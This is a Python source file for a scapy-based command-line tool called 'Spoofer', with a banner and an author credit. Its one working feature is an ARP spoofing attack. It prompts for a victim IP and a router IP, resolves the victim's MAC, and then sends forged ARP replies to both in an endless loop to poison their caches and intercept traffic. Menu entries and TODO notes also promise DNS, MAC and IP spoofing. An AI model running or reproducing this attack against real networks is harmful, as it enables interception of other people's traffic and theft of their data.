import scapy.all as scapy
import sys
import time
import os
from colorama import init, Fore, Back, Style
import threading

# TODO: Add DNS Spoofing
# TODO: Add MAC Address Spoofing
# TODO: Add IP Address Spoofing
# TODO: Add background process to install requirements 

def installingReq():
    pass

class loadingScreens():
    def __init__(self, choice):
        if choice == 1:
            self.initializing()

    def initializing(self):
        words = [
    "[+] Initializing",
    "[+] iNitializing",
    "[+] inItializing",
    "[+] iniTializing",
    "[+] initIalizing",
    "[+] initiAlizing",
    "[+] initiaLizing",
    "[+] initialIzing",
    "[+] initialiZing",
    "[+] initializIng",
    "[+] initializiNg",
    "[+] initializinG"
]
        for i in range(2):
            for word in words:
                print(f"\r{word}", end="")
                time.sleep(0.3)

        print("\n")

class ARP_SPOOFING:
    def __init__(self):
        vicIp, routIP = self.askInput()
        self.sentPacketCount = 0

        while True:
            self.sentPacketCount += 2
            self.arpSpoof(vicIp, routIP)
            self.arpSpoof(routIP, vicIp)
            print("\r[+] Packets sent: " + str(self.sentPacketCount), end="")
            sys.stdout.flush()
            time.sleep(2)

    def askInput(self):
        victim_ip = input("[Victim IP Address]>>> ")
        print("\r")
        router_ip = input("[Router IP Address]>>> ")
        print("\r")
        return victim_ip, router_ip
    
    def arpSpoof(self, targetIp, spoofIP):
        arp_packet = scapy.ARP(op=2, pdst=targetIp, hwdst=self.getMac(targetIp), psrc=spoofIP) # making an ARP packet, psrc = source ip, pdst = destination ip, hwdst = destination mac
        scapy.send(arp_packet)


    def getMac(self, ip):
        arpReq = scapy.ARP(pdst=ip) # set the destination ip address to the IP address of the target
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # set the mac address to a broadcast address
        arpReq_broadcast = broadcast/arpReq # builds the packet from left to right. Layer 2 and layer 3 respectively. 

        ans = scapy.srp(arpReq_broadcast, timeout=2, verbose=False)[0] # send the packet and get the response, waits for 2 seconds

        return ans[0][1].hwsrc

def banner():
    print("""
         _____                   ____         
        / ___/____  ____  ____  / __/__  _____
        \__ \/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
         ___/ / /_/ / /_/ / /_/ / __/  __/ /    
        /____/ .___/\____/\____/_/  \___/_/     
            /_/                                 

        Author: SHAWN MICHAEL SUDARIA
        Version: 1.0
         
        """)
    
def main():
    os.system('cls||clear')
    loadingScreens(1)
    os.system('cls||clear')
    banner()
    print("""
    Choose:
          1. ARP Spoofing
          2. DNS SPoofing $(Coming Soon)
          3. MAC Address Spoofing $(Coming Soon)
          4. IP Address Spoofing $(Coming Soon)
    \n\n""") 
    choice = input("spf>>> ")
    if(choice == "1"):
        os.system("cls||clear")
        banner()
        arpS = ARP_SPOOFING()
    elif (choice == "q" or choice == "Q" or choice == "quit" or choice == "QUIT"):
        exit()
    
if __name__ == "__main__":
   main() 
